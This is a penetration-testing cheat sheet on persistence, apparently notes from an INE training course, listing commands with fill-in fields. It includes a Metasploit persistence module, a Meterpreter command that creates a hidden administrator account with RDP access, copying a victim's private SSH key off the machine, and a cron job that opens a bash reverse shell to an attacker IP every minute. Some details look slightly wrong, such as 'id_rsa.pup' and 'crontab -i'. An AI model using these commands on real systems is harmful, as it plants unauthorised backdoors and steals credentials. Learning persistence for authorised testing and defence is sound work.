# Persistence

* [Windows](#windows)
* [Linux](#linux)
* [References](#references)

******************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
******************************************************************************

## Windows

### msfconsole

```
use exploit/windows/local/persistence_service
```

### RDP

#### Meterpreter

* Create new user on target machine:
   * Enables RDP
   * Sets Terminal Services to auto
   * Opens port in local firewall
   * Sets user account for logon
   * Hides user from login screen
   * Adds user to Remote Desktop Users
   * Adds user to Administrators group
   * note the cleanup command at the end of the output
```
run getgui -e -u [USERNAME] -p [PASSWORD]
```

Log in via xfreerdp:
```
xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET-IP]
```

***********************************************************************

## Linux

### Persistence via SSH Keys

* private key is "id_rsa"
* public key is "id_rsa.pup"
* stored in .ssh
```
cat authorized_keys
```

Transfer private key from target machine to attack machine:
```
scp [USERNAME]@[TARGET-IP]:[PATH-TO-id_rsa] .
```

Give id_rsa correct permissions;
```
chmod 400 id_rsa
```

Login with private key via SSH:
```
ssh -i id_rsa [USERNAME]@[TARGET-IP]
```

### Persistence via Cron Jobs

Display cron jobs:
```
cat /etc/cron*
```

Make a persistent cron file:
```
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/[ATTACK-IP]/[LPORT] 0>&1'" > [OUTFILE]
```

Add it to crontab:
```
crontab -i [OUTFILE]
```

Show crontab:
```
crontab -l
```

***********************************************************************

### References
Penetration Tester Student v2 by INE  
https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2